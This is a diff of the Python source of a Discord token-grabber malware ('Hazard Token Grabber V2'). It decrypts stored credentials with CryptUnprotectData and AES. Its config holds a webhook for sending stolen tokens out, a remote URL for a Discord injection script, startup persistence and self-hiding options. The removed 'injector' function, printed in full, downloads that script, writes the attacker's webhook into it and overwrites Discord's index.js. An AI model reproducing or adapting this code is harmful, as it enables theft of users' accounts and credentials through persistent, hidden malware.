@@ -19,16 +19,16 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # replace WEBHOOK_HERE with your webhook
-    'webhook': "WEBHOOK_HERE",
+    # Replace the string inbetween the quotations with your webhook.
+    'webhook': "put_your_webhook_here",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill Discord upon running exe
-    'kill_discord': True,
+    'kill_discord': False,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
-    'hide_self': True
+    'hide_self': False
 }
 
 
@@ -134,7 +134,6 @@ class Hazard_Token_Grabber_V2(functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
-        await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
@@ -146,28 +145,6 @@ class Hazard_Token_Grabber_V2(functions):
             shutil.copy2(argv[0], self.startup)
         except Exception:
             pass
-
-    async def injector(self):
-        for _dir in os.listdir(self.appdata):
-            if 'discord' in _dir.lower():
-                discord = self.appdata+self.sep+_dir
-                disc_sep = discord+self.sep
-                for __dir in os.listdir(os.path.abspath(discord)):
-                    if match(r'app-(\d*\.\d*)*', __dir):
-                        app = os.path.abspath(disc_sep+__dir)
-                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
-                        if os.path.exists(inj_path):
-                            if self.startup not in argv[0]:
-                                try:
-                                    os.makedirs(
-                                        inj_path+'initiation', exist_ok=True)
-                                except PermissionError:
-                                    pass
-                            f = httpx.get(self.config('injection_url')).text.replace(
-                                "%WEBHOOK%", self.webhook)
-                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
-                                indexFile.write(f)
-                            os.startfile(app + self.sep + _dir + '.exe')
 
     def killDiscord(self):
         for proc in psutil.process_iter():
